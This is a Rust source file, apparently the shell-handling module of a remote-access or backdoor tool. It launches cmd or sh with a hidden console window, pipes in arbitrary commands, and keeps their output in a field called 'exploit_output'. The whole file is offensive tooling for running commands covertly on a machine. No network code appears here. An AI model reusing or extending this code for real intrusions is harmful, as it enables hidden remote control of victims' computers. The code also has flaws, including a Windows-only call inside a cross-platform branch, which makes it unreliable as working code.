use std::{
    io::{Read, Write},
    os::windows::process::CommandExt,
    process::{Child, ChildStderr, ChildStdin, ChildStdout, Command, Stdio},
};

#[derive(Debug)]
pub struct ShellStream {
    exploit_output: Vec<u8>,
    stdin_stream: Option<ChildStdin>,
    stdout_stream: Option<ChildStdout>,
    stderr_stream: Option<ChildStderr>,
}

impl ShellStream {
    pub fn default() -> ShellStream {
        let shell = ShellStream::new();
        ShellStream {
            exploit_output: vec![],
            stdin_stream: shell.stdin,
            stdout_stream: shell.stdout,
            stderr_stream: shell.stderr,
        }
    }
    pub fn new() -> Child {
        let mut shell = if cfg!(target_os = "windows") {
            Command::new("cmd")
        } else {
            Command::new("sh")
        };
        shell
            .creation_flags(0x08000000)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .expect("Failed to start remote new")
    }

    fn read_buffer(&mut self, buffer_size: usize) -> Vec<u8> {
        let mut output: Vec<u8> = vec![0u8; buffer_size];

        let stdout = match &mut self.stdout_stream {
            Some(stdout) => stdout,
            None => return vec![],
        };

        let stderr = match &mut self.stderr_stream {
            Some(stderr) => stderr,
            None => return vec![],
        };

        loop {
            match stdout.read(&mut output) {
                Ok(bytes_read) if bytes_read != output.len() => {
                    output.retain(|&x| x != 0u8);
                    break;
                }
                Ok(_) => {
                    output.resize(output.len() + buffer_size, 0);
                } // Continue loopContinue loop
                Err(e) => panic!("Failed to read from stdout: {}", e),
            }
        }

        if output.is_empty() {
            loop {
                match stderr.read(&mut output) {
                    Ok(bytes_read) if bytes_read != output.len() => {
                        output.retain(|&x| x != 0u8);
                        break;
                    }
                    Ok(_) => {
                        output.resize(output.len() + buffer_size, 0);
                    } // Continue loopContinue loop
                    Err(e) => panic!("Failed to read from stderr: {}", e),
                }
            }
        }

        output
    }
}

pub trait HandleShellStream {
    fn execute(&mut self, input: Vec<u8>);
    fn get_output(&mut self) -> Vec<u8>;
}

impl HandleShellStream for ShellStream {
    fn execute(&mut self, input: Vec<u8>) {
        if let Some(input_stream) = self.stdin_stream.as_mut() {
            input_stream.write(&input).unwrap();
            input_stream.write(b"\n").unwrap();
            input_stream.flush().unwrap()
        }

        self.exploit_output = self.read_buffer(1024);
    }

    fn get_output(&mut self) -> Vec<u8> {
        self.exploit_output.clone()
    }
}
